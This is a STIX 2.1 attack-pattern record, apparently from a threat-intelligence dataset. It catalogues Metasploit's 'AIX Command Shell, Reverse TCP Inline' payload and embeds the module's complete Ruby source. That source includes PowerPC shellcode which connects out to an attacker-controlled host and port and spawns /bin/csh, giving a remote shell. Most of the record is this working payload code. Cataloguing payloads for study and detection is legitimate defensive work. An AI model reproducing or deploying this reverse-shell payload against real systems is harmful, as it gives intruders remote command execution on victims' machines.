{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--286b038e-f8e9-4a6d-a223-8753909d9dda",
    "created": "2024-08-14T16:33:19.40195Z",
    "modified": "2024-08-14T16:33:19.401954Z",
    "name": "AIX Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/aix/ppc/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 204\n\n  include Msf::Payload::Single\n  include Msf::Payload::Aix\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'AIX Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        => 'Ramon de C Valle',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'aix',\n      'Arch'          => ARCH_PPC,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 32, 'ADDR' ],\n              'LPORT'    => [ 30, 'n'    ],\n            },\n        }\n    ))\n\n  end\n\n  def generate(*args)\n    super(*args)\n\n    payload =\n    \"\\x7c\\xa5\\x2a\\x79\"     + #   xor.    r5,r5,r5                   #\n    \"\\x40\\x82\\xff\\xfd\"     + #   bnel    <cntsockcode>              #\n    \"\\x7f\\xc8\\x02\\xa6\"     + #   mflr    r30                        #\n    \"\\x3b\\xde\\x01\\xff\"     + #   cal     r30,511(r30)               #\n    \"\\x3b\\xde\\xfe\\x25\"     + #   cal     r30,-475(r30)              #\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x20\"     + #   bctr                               #\n    \"\\xff\\x02\\x11\\x5c\"     + #   .long   0xff02115c                 #\n    \"\\x7f\\x00\\x00\\x01\"     + #   .long   0x7f000001                 #\n    \"\\x4c\\xc6\\x33\\x42\"     + #   crorc   6,6,6                      #\n    \"\\x44\\xff\\xff\\x02\"     + #   svca    0                          #\n    \"\\x3b\\xde\\xff\\xf8\"     + #   cal     r30,-8(r30)                #\n    \"\\x3b\\xa0\\x07\\xff\"     + #   lil     r29,2047                   #\n    \"\\x38\\x9d\\xf8\\x02\"     + #   cal     r4,-2046(r29)              #\n    \"\\x38\\x7d\\xf8\\x03\"     + #   cal     r3,-2045(r29)              #\n    @cal_socket +\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n    \"\\x7c\\x7c\\x1b\\x78\"     + #   mr      r28,r3                     #\n    \"\\x38\\xbd\\xf8\\x11\"     + #   cal     r5,-2031(r29)              #\n    \"\\x38\\x9e\\xff\\xf8\"     + #   cal     r4,-8(r30)                 #\n    @cal_connect +\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n    \"\\x3b\\x7d\\xf8\\x03\"     + #   cal     r27,-2045(r29)             #\n    \"\\x7f\\x63\\xdb\\x78\"     + #   mr      r3,r27                     #\n    @cal_close +\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n    \"\\x7f\\x65\\xdb\\x78\"     + #   mr      r5,r27                     #\n    \"\\x7c\\x84\\x22\\x78\"     + #   xor     r4,r4,r4                   #\n    \"\\x7f\\x83\\xe3\\x78\"     + #   mr      r3,r28                     #\n    @cal_kfcntl +\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n    \"\\x37\\x7b\\xff\\xff\"     + #   ai.     r27,r27,-1                 #\n    \"\\x40\\x80\\xff\\xd4\"     + #   bge     <cntsockcode+100>          #\n    \"\\x7c\\xa5\\x2a\\x79\"     + #   xor.    r5,r5,r5                   #\n    \"\\x40\\x82\\xff\\xfd\"     + #   bnel    <cntsockcode+148>          #\n    \"\\x7f\\x08\\x02\\xa6\"     + #   mflr    r24                        #\n    \"\\x3b\\x18\\x01\\xff\"     + #   cal     r24,511(r24)               #\n    \"\\x38\\x78\\xfe\\x29\"     + #   cal     r3,-471(r24)               #\n    \"\\x98\\xb8\\xfe\\x31\"     + #   stb     r5,-463(r24)               #\n    \"\\x94\\xa1\\xff\\xfc\"     + #   stu     r5,-4(r1)                  #\n    \"\\x94\\x61\\xff\\xfc\"     + #   stu     r3,-4(r1)                  #\n    \"\\x7c\\x24\\x0b\\x78\"     + #   mr      r4,r1                      #\n    @cal_execve +\n    \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n    \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n    \"/bin/csh\"\n\n    # If the payload is generated and there are offsets to substitute,\n    # do that now.\n    if (payload and offsets)\n      substitute_vars(payload, offsets)\n    end\n\n    payload\n  end\nend\n",
    "x_mitre_platforms": [
        "aix'"
    ]
}